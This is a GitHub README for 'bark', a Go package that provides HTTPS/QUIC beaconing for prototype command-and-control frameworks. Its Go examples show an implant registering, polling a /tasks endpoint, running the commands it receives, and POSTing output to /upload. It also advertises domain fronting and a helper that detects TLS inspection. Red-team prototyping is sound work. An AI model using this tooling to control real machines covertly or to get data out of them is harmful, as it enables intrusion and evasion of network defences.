# bark
[![Go Report Card](https://goreportcard.com/badge/github.com/salukikit/bark)](https://goreportcard.com/report/github.com/salukikit/bark)
[![Go Reference](https://pkg.go.dev/badge/github.com/salukikit/bark.svg)](https://pkg.go.dev/github.com/salukikit/bark)
---
**WARNING**: This repo is still in active development and is subject to breaking changes.

**bark** is a simple HTTP/QUIC RESTful beaconing package for use in prototype/template C2's.

The idea behind bark is to provide a quick C2-lite https/quic comms package for small projects/pocs. It should hopefully save you rewriting a beaconing package everytime you want to try and create a new C2 or test an idea out.

With bark you can really structure your comms data however you like. Bark simply provides some quick wrappers around HTTPS and QUIC, with hopefully enough customisation to suit your needs. It's deliberately simple in functionality, so that you can implement more complex logic yourself as and when desire.

## What does it do?

**bark does:**

* Simplyfy the process of setting up HTTPS/QUIC comms channel.
* Work with domain fronting, including AWS.
* Plug-n-play:
    - Use only portions of Bark or all of it. Roll your own routes and server, but use the beacon package and vice-versa.
    - Use any of any transport compatible with the stdlib http.RoundTripper.
    - Use HTTP, HTTPS, HTTP3, or pure QUIC for transporting any []byte-able data.
* Retain's cookies via a cookiejar (WIP, but hopefully useable for rolling your own auth soon).
* Provides helpers for common C2 beaconing tasks, such as checking for TLS inspection.

**bark does not:**

* Handle beacon timings, retries and more.
* Implement command/Implant logic.
* Provide e2e encryption - bark only uses tls, you must use your own extra encryption mechanism if you want one.
* Custom/obfuscation profiles:
Some of this is possible via some of the extra bark.BarkMsg struct, e.g. headers, but really anything smarter should be done from scratch.

## bark Comms Flow

Below shows an example bark workflow which operates over four steps, for complete examples, see the examples directory.

1. Comms setup: 
The Implant comms need to be setup before any comms can take place.
```go

//Setup a router, and do not verify certificates.
    mybarker := bark.NewBarkerHTTP("mynewhttpcomms", false)
	mybarker.Ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
	//BarkHost should include the protocol, e.g. http:// or https://
	mybarker.BarkHost = "https://127.0.0.1:8080"

```

2. Register [optional]:
The Implant calls out to registration URL or URLs, use this stage to add the implant to your DB, return info etc.
As it's optional, you can also just use the beaconing requests instead.

```go
    //Set BarkMsg for registering implant.
	registermessage := &bark.BarkMsg{
		Uri:    "/register",
		Method: "GET",
	}

    //Send a registration request.
    resp, err := mybarker.Bark(*registermessage)
    if err != nil {

        time.Sleep(beacontime)
        continue
    }
    // Do something with the response (key-exchange, config update, choice is yours!)
```

3. Beacon:
Send a beacon (GET request) out to your desired endpoints.

```go
    //Set BarkMsg for beaconing.
    beaconmsg := &bark.BarkMsg{
        Uri:    "/tasks",
        Method: "GET",
    }
    //Send a beacon request out.
    encCmd, err := mybarker.Bark(*beaconmsg)
    if err != nil {
        time.Sleep(beacontime)
        continue
    }
    //Comnand Returned, do something with it:
    cmd, ok := YourDecryptFunc(encCmd)
```

4. Post Output [optional]:
If a cmd needs to return output, these endpoints can be sent post requests with the relevant data. 

```go
    //Command is good, run command
    output := RunCmd(cmd)
    encdata, ok := YourEncryptFunc([]byte(output))
    if ok {
        //Task ran fine, send output back.
        taskcompletemsg := &bark.BarkMsg{
            Uri:    "/upload",
            Method: "POST",
            Body:   []byte(encdata),
        }
    _, err := mybarker.Bark(*taskcompletemsg)
    }

```

Each of the Bark() funcs return the request body as a `[]byte` so that you can send any "byte-able" format and interpret the response however you please. They also store the request cookies. Headers and other HTTP data is not accessible to keep things simple.

For example, you might use `encoding/gob` to unmarshall the data into a go-readable struct, or simply use an entirely custom format. For example there is no reason you couldn't send an encrypted file, a totally custom binary format or even just a simple string. Anything goes so long as you can safely convert it to and from a byte slice.

## Helpers

There are also currently several helpers in Bark, the top two are:

* Jitter - Pass it a time.Duration and a float, and it'll handle Jitter calculations for you.
* GetTLSCertIssuer - Returns the Cert Issuer as a string, useful for checking if TLS is inspected.

Currently it only supports HTTP(s)/QUIC, but more is planned.

WIP additions:

* Simple Proxy & ntlm proxy support.
* Pure QUIC comms for beaconing and pivot connectivity (Howl).
* Header Support.
* Multiple URL Helper function.
* Add unit testing.